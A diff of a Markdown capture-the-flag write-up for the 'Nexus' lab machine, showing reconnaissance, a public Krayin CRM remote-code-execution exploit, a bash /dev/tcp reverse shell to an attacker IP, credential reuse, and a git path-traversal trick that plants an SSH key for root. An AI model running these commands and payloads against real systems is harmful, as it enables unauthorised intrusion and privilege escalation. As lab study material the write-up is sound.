@@ -24,6 +24,7 @@ SSH key into root's `authorized_keys`.
 
 
 ## Reconnaissance
+
 - Nmap scan
 ```shell
 sudo nmap -A -O -T4 -v -p- 10.129.34.224
@@ -53,15 +54,22 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 - Added nexus.htb to host file - Navigating to port 80 presents with web page for Nexus Energy Authority
+
 ![http](images/Nexus-1.png)
+
 - Reviewing the website provides a job posting
+
 ![http](images/nexus-2.png)
+
 - Reviewing the job posting, an apply option and potential user are located
+
 ![http](images/nexus-3.png)
 
 
 ## Enumeration
+
 - Using ffuf for vhosts enumeration was able to locate git.nexus.htb
+
 ```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' -c -ac
 
@@ -149,18 +157,31 @@ volumes:
   dbvolume:
 ```
 - Checking the changes and notifications expose the password for the database
+
 ![http](images/nexus-6.png)
+
 - Navigating to billing.nexus.htb reveals Krayin sign-in portal (confirmed mysql backend)
+
 ![http](images/nexus-7.png)
+
 - There is a banner at the bottom that shows messages and potential leaked information about the page
+
 ![http](images/nexus-8.png)
+
 - Testing login with our potential user and the password allows a successful login
+
 ![http](images/nexus-9.png)
+
 - Version of the application is located from checking the user profile
+
 ![http](images/nexus-10.png)
+
 - Searching for an exploit provides CVE-2026-38526
+
 https://www.exploit-db.com/exploits/52629
+
 - Reviewing of the public exploit confirms requirements
+
 ```shell
   python3 52629.py                             
 usage: 52629.py [-h] -t TARGET -u USER -p PASSWORD -f FILE
@@ -173,6 +194,7 @@ www-data
 ```
 
 ## Initial Foothold
+
 - With confirmation of remote code execution, an update to the command provides a reverse shell
 ```shell
 python3 exploit.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p '<REDACTED>' -c "bash -c 'bash -i >& /dev/tcp/10.10.16.97/9001 0>&1'"
@@ -191,8 +213,11 @@ www-data@nexus:~/krayin/storage/app/public/tinymce$
 ```
 
 ## Privilege Escalation
+
 - With a stable shell, further enumeration of the website to look for any database and credentials is needed
+
 - Locating the .env file in the Krayon directory, exposes the database credentials
+
 ```shell
 DB_CONNECTION=mysql
 DB_HOST=127.0.0.1
@@ -203,9 +228,13 @@ DB_PASSWORD=<REDACTED>
 DB_PREFIX=
 ```
 - Enumeration of users on the box locates a user jones in the /etc/passwd file
+
 - Since the last database password allowed access, logic dictatesSSH with this new password for user jones may be possible (successful)
+
 ![http](images/nexus-11.png)
+
 - Upload linpeas via wget and change to executable
+
 ```shell
 jones@nexus:~$ wget http://10.10.16.97:8000/linpeas.sh
 --2026-07-25 20:58:18--  http://10.10.16.97:8000/linpeas.sh
@@ -224,14 +253,18 @@ jones@nexus:~$ chmod +x linpeas.sh
 jones@nexus:~$ ./linpeas.sh 
 ```
 - Linpeas identified potential capabilities privilege escalation
+
 ![http](images/nexus-12.png)
+
 - Confirmed by running getcap on /usr/lib/snapd/snap-confie and seeing cap_dac_override
+
 ```shell
 jones@nexus:~$ getcap /usr/lib/snapd/snap-confine
 /usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
 ```
 - https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE
 - Uploaded 
+
 ```shell
 jones@nexus:~$ wget http://10.10.16.97:8000/exploit_caps.c
 --2026-07-25 21:17:18--  http://10.10.16.97:8000/exploit_caps.c
@@ -257,6 +290,7 @@ librootshell_caps.c         100%[=========================================>]    
 
 ```
 - Unfortunately, gcc is not installed on the box...
+
 ```shell
 jones@nexus:~$ gcc -O2 -static -o exploit exploit_caps.c
 Command 'gcc' not found, but can be installed with:
@@ -264,8 +298,11 @@ apt install gcc
 Please ask your administrator.
 ```
 - Uploaded pspy to check for processes and any running tasks (located interesting systemd timer)
+
 ![http](images/nexus-13.png)
+
 - Running command to check timers and located a gitea sync timer
+
 ```shell
 jones@nexus:~$ systemctl list-timers
 NEXT                            LEFT LAST                              PASSED UNIT                           >
@@ -289,8 +326,11 @@ Mon 2026-07-27 01:36:31 UTC 1 day 4h Sat 2026-07-25 20:16:09 UTC  1h 6min ago fs
 16 timers listed.
 ```
 - Located /etc/gitea directory - Navigating and enumerating this directory exposed template-sync.py
+
 ![http](images/nexus-14.png)
+
 - Reviewing the code confirms there is an exploit in the way the script using the git ls-tree command and gets the raw file path without sanitization
+
 ```python
 # Extract files to staging directory
     for mode, objhash, filepath in entries:
@@ -324,21 +364,30 @@ Mon 2026-07-27 01:36:31 UTC 1 day 4h Sat 2026-07-25 20:16:09 UTC  1h 6min ago fs
 ```
 
 - From here, a repository is setup and python script created to add SSH keygen to authorized_keys
+
 - Access to the website as jones in gitea (successful)
+
 - Naming the repository (you can name this anything, lets be stealthy and name it "KrayinUpdate")
+
 ![http](images/nexus-15.png)
+
 - Ensuring a repository a template is checked
+
 ![http](images/nexus-16.png)
+
 - Generating an SSH Key
+
 ```shell
 ssh-keygen -t ed25519 -f /tmp/.k -N ''
 ```
 - A README.md file is required
+
 ```shell
 touch README.md
 ```
 
 - The goal of travers up to the root and then down to authorized_keys is accomplished by using the below python script to automate the traversal payload
+
 ```python
 # build.py
 #!/usr/bin/env python3
@@ -444,6 +493,7 @@ with open(os.path.join(refs_directory, "main"), "w") as file:
 print("Done: " + sha)
 ```
 - Running the script confirms successful
+
 ```shell
 python3 build.py
 Done: 7178219d4cdb95e5ece4fb90e9a2b10db328f7ee
@@ -465,6 +515,7 @@ branch 'main' set up to track 'origin/main'.
 ```
 
 - Waiting for the sync timer - After a few minutes, logs confirm changes were uploaded
+
 ```shell
 [2026-07-25 21:50:35] Found 1 template repo(s)
 [2026-07-25 21:50:35] Syncing template: jones/KrayinUpdate
@@ -485,6 +536,7 @@ branch 'main' set up to track 'origin/main'.
 ```
 
 - SSH as root and get the flag
+
 ```shell
 ssh -i /tmp/.k root@nexus.htb           
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)
@@ -538,6 +590,7 @@ drwx------  2 root root 4096 May 12 12:06 .ssh
 
 ```
 ## Key Takeaways
+
 - Some python script reading is required as well as understanding git and pushing changes
 - Checking for services (pspy) can also lead to apps/scripts running as root or another elevated user
 - there may be multiple paths to root, however, it's good to know when to stop and move on
